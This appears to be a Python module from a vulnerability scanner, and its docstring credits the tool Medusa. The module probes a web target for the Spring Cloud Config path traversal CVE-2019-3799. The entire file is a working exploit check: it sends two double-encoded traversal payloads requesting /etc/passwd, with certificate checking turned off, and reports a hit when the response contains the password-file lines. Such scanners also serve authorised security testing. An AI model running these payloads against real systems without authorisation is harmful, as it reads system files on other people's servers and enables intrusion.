# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  Spring_CVE_2019_3799.py
@Desc: 脚本来源于工具Medusa，很好用，直接轮子过来了
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def Spring_CVE_2019_3799(Url):
    scheme, url, port = umethod(Url)
    payload1 = "/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd"
    payload2 = "/a/b/master/..%252F..%252Fetc%252Fpasswd"
    for i in [payload1, payload2]:
        try:
            payload_url = scheme + "://" + url + ":" + str(port) + i
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en',
                'Connection': 'close',
                "Upgrade-Insecure-Requests": "1"
            }

            resp = requests.get(payload_url, headers=headers, timeout=6, verify=False,allow_redirects=False)
            con = resp.text
            code = resp.status_code
            if code == 200 and con.find("root:x:") != -1 and con.find("bin:x") != -1 and con.find("lp:x") != -1:
                print(Vcolors.RED +"[!] 存在Spring路径遍历漏洞:->Spring_CVE_2019_3799\r" + Vcolors.ENDC)
        except:
            logging.error("Spring_CVE_2019_3799脚本出现异常")